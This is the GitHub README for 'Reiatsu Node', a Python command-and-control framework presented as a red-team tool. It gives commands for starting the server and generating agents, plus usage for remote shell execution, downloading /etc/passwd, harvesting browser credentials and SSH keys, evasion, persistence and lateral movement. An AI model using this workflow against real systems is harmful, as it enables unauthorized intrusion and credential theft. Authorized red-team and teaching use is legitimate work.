# 🔮 Reiatsu Node

**Reiatsu Node is a full-featured Command & Control framework built in Python. It is designed to provide security professionals and researchers with a robust platform to simulate and study the entire post-exploitation lifecycle of modern adversary operations. Its modular architecture and focus on secure, encrypted communications make it a powerful tool for authorized red team engagements and advanced security education.**

<p align="center">
  <img src="ss/CLI Interface.png" alt="Reiatsu Node CLI Interface" width="800">
</p>

## Features

-  **Encrypted Communications** - AES-256-GCM + SSL/TLS dual-layer encryption
-  **Cross-Platform Agents** - Deploy on Windows, Linux, and macOS
-  **Remote Shell Execution** - Execute commands on compromised hosts
-  **Interactive PTY Shell** - Full terminal access (Linux/macOS)
-  **Modular Post-Exploitation** - 8 built-in modules
-  **Session Management** - Track and manage multiple agents
-  **Beacon Architecture** - Configurable check-in intervals

## Installation

### Prerequisites

- Python 3.8+
- cryptography library

### Quick Start

```bash
# Clone the repository
git clone https://github.com/ryuk27/reiatsu-node.git
cd reiatsu-node

# Install dependencies
pip install cryptography

# Optional: For screenshot module
pip install Pillow pyscreenshot

# Start the C2 server
python reiatsu.py --host 0.0.0.0 --port 8443

# Generate payload (in separate terminal)
python payload_generator.py -t lin -o agent.py
```

## Usage

### Starting the C2 Server

```bash
# Basic usage
python reiatsu.py --host 0.0.0.0 --port 8443

# Listen on all interfaces (requires sudo for port 443)
sudo python reiatsu.py --host 0.0.0.0 --port 443
```

### Generating Payloads

```bash
# Linux/macOS payload
python payload_generator.py -t lin -o linux_agent.py

# Windows payload
python payload_generator.py -t win -o windows_agent.pyw
```

### C2 Commands

| Command | Shortcut | Description |
|---------|----------|-------------|
| `sessions` | `s` | List all connected agents |
| `info <id>` | - | Show agent details |
| `shell <id> <cmd>` | - | Execute shell command |
| `results <id>` | `r <id>` | View command output |
| `modules` | `m` | List available modules |
| `module <id> <name> [args]` | - | Run module on agent |
| `interactive_shell <id>` | `is <id>` | Start PTY shell (Linux) |
| `kill <id>` | - | Terminate agent |
| `clear` | - | Clear terminal |
| `help` | `?` | Show help |
| `exit` | `quit` | Exit server |

### Example Session

```
reiatsu> sessions
ID                                   IP              Status   Last Seen
--------------------------------------------------------------------------------
a1b2c3d4-e5f6-7890-abcd-ef1234567890 192.168.1.100   ONLINE   2024-01-15 10:30:00

reiatsu> shell a1b2c3d4-e5f6-7890-abcd-ef1234567890 whoami
[+] Queued Shell: whoami for agent a1b2c3d4...

reiatsu> results a1b2c3d4-e5f6-7890-abcd-ef1234567890
--- Result 1 ---
Type: shell
Output:
root

reiatsu> module a1b2c3d4-e5f6-7890-abcd-ef1234567890 sysinfo
[+] Queued Module: sysinfo for agent a1b2c3d4...

reiatsu> module a1b2c3d4-e5f6-7890-abcd-ef1234567890 fileops list /etc
[+] Queued Module: fileops for agent a1b2c3d4...
```

## Available Modules

| Module | Description | Usage |
|--------|-------------|-------|
| `sysinfo` | Comprehensive system reconnaissance | `module <id> sysinfo` |
| `fileops` | File operations (download, list, search) | `module <id> fileops <action> <path>` |
| `screenshot` | Capture desktop screenshot | `module <id> screenshot` |
| `creds` | Extract browser credentials and SSH keys | `module <id> creds` |
| `evasion` | Sandbox/VM detection | `module <id> evasion` |
| `lateral` | Network reconnaissance | `module <id> lateral` |
| `persistence` | Persistence technique examples | `module <id> persistence` |
| `lolbins` | Living-off-the-land commands | `module <id> lolbins` |

### Module Details

#### sysinfo - System Information
Gathers comprehensive system information including:
- Basic system info (OS, architecture, hostname)
- User information (username, privileges, home directory)
- Network configuration (IPs, interfaces, gateway)
- Disk information
- Running processes and security products
- Environment variables

```
reiatsu> module <agent_id> sysinfo
```

#### fileops - File Operations
Perform file operations on target system:

```bash
# List directory contents
reiatsu> module <agent_id> fileops list /etc

# Download file (base64 encoded)
reiatsu> module <agent_id> fileops download /etc/passwd

# Search for files
reiatsu> module <agent_id> fileops search /home *.txt

# View text file contents
reiatsu> module <agent_id> fileops cat /var/log/syslog

# Show current directory
reiatsu> module <agent_id> fileops pwd
```

#### screenshot - Desktop Capture
Capture target desktop screenshot:
- Windows: Uses PIL, mss, or PowerShell
- Linux: Uses pyscreenshot, scrot, or ImageMagick
- macOS: Uses screencapture

```
reiatsu> module <agent_id> screenshot
```

Output is base64 encoded PNG. Decode with:
```bash
echo '<base64_data>' | base64 -d > screenshot.png
```

#### creds - Credential Harvesting
- Windows: Browser credentials (Chrome, Edge)
- Linux: SSH private keys

#### evasion - Defense Evasion
- Sandbox/VM detection
- Obfuscation examples

#### lateral - Lateral Movement
- ARP table analysis
- Movement technique examples

#### persistence - Persistence
- Windows: Registry run keys
- Linux: Cron jobs

#### lolbins - Living Off The Land
- Native binary abuse techniques

## Project Structure

```
reiatsu-node/
├── reiatsu.py              # Main C2 server entry point
├── payload_generator.py    # Agent payload generator
├── core/
│   ├── c2_server.py        # C2 server implementation
│   └── agent_template.py   # Agent template
├── modules/
│   ├── sysinfo.py          # System information (NEW)
│   ├── fileops.py          # File operations (NEW)
│   ├── screenshot.py       # Screenshot capture (NEW)
│   ├── creds.py            # Credential harvesting
│   ├── evasion.py          # Defense evasion
│   ├── lateral.py          # Lateral movement
│   ├── persistence.py      # Persistence techniques
│   └── lolbins.py          # LOLBins techniques
└── payloads/               # Generated payloads
```

## Configuration

The server automatically generates:
- `cert.pem` / `key.pem` - SSL certificates
- `reiatsu.key` - AES encryption key
- `server_state.json` - Server config for payload generation

## Security Features

- **AES-256-GCM** - Authenticated encryption for all C2 traffic
- **SSL/TLS** - Transport layer encryption
- **Unique Agent IDs** - Based on system characteristics
- **Session Timeout** - Automatic offline detection

## Comparison

| Feature | Reiatsu | Cobalt Strike | Metasploit |
|---------|---------|---------------|------------|
| Cost | Free | $3,500/year | Free |
| Language | Python | Java | Ruby |
| Encryption | AES-256-GCM | AES | Various |
| Learning Curve | Easy | Complex | Moderate |
| Modules | 8 | 100+ | 2000+ |

## Legal Disclaimer

**Reiatsu Node is intended for authorized security testing and educational purposes only.**

- ✅ Authorized penetration testing
- ✅ Red team engagements with permission
- ✅ Security research and education
- ❌ Unauthorized access to systems
- ❌ Malicious activities

Users are responsible for ensuring they have proper authorization before using this tool. Unauthorized use may violate laws in your jurisdiction.
